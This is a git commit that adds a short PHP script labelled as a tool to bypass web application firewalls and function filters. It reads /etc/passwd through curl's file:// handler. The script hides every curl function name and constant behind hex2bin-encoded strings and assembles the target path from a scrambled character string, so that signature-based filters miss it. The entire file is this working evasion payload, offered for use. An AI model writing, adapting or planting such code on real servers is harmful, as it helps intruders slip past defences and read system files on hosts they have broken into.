8bbdec3d8282ddc4b0dab2d347c07da4850ec1d5
Abdi Prawira N <31374361+keepwannabe@users.noreply.github.com>
2019-01-15 18:04:34 +0700

    Repo for Bypasser Files

---
+++ bypasser-files/readfile-curl.php
@@ -0,0 +1,9 @@
+<?php
+/* 
+bypass WAF & filter function
+script to read file /etc/passwd using curl <3 
+created by ardzz <3 
+*/
+$a="he"."x2"."b"."in";$chh = $a("6375726c5f696e6974");$ch = $chh(); $c = $a("6375726c5f7365746f7074");$cc = $a("4355524c4f50545f55524c");$ccc = $a("4355524c4f50545f52455455524e5452414e53464552");$fna = "/cetspadw";$fn = $fna[0].$fna[2].$fna[3].$fna[1].$fna[0].$fna[5].$fna[6].$fna[4].$fna[4].$fna[8].$fna[7];$c($ch, CURLOPT_URL, "fi"."le://{$fn}");$c($ch, CURLOPT_RETURNTRANSFER, 1);$ex = $a("6375726c5f65786563");$output = $ex($ch); $cl = $a("6375726c5f636c6f7365");$cl($ch);  echo $output;
+?>
+
